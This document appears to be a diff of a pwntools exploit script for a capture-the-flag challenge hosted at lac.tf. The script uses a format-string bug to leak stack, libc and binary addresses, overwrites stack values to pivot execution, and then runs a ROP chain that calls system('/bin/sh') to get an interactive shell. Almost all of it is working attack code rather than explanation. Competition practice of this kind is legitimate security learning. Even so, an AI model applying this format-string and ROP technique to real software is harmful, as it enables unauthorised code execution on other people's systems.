@@ -16,8 +16,8 @@ elf, rop = ELF(vuln_path), ROP(vuln_path)
 libc, roplibc = ELF(libc_path), ROP(libc_path)
 
 if not f_remote:
-    #io = process(vuln_path)
-    io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
+    io = process(vuln_path)
+    #io = process([ld_path, vuln_path], env={"LD_PRELOAD": libc_path})
 else:
     io = remote("lac.tf", 31134)
 
@@ -27,14 +27,15 @@ def ddebug(b=""):
         return
 
     gdb.attach(io, gdbscript=b)
-    #pause()
+    pause()
 
 
-delta = 0x7ffd18849be7 - 0x7ffd18849a10
-libcdelate = 0x7fd96fcf5604 - 0x7fd96fc50000
-elfdelate = 0x7f5d8dad6265 - 0x7f5d8dad5000 
+delta = 0x7fff50afc8b0 - 0x7fff50afc5c0
+libcdelate = 0x7f57df429d0a - 0x7f57df406000
+elfdelate = 0x56509590e220 - 0x0056509590d000
 
-payload = "%60$p-%61$p-%63$p"
+payload = "%68$p-%71$p-%70$p"
+ddebug()
 io.sendlineafter("to post?\n", payload)
 io.recvuntil("\n")
 rbp_0x200 = int(io.recvuntil("-")[:-1], 16) - delta
@@ -52,14 +53,15 @@ leave_ret = elf.address + 0x0000000000001217
 ret = elf.address + 0x0000000000001016
 pop_rdi = elf.address + 0x000000000000127b
 
-write_dict = { rbp_0x200 +0x200:rbp_0x200+224, rbp_0x200 +0x208:leave_ret }
-payload = fmtstr_payload(6, write_dict,write_size="byte")
+print(libc.symbols["system"])
+
+write_dict = {rbp_0x200 + 0x200: rbp_0x200 + 224, rbp_0x200 + 0x208: leave_ret}
+payload = fmtstr_payload(6, write_dict, write_size="byte")
 payload += p64(pop_rdi)
 payload += p64(next(libc.search(b"/bin/sh\x00")))
 payload += p64(ret)
 payload += p64(libc.symbols["system"])
 
-ddebug(f"b *{b}") 
 io.sendlineafter("like to post?", payload)
 
 io.interactive()
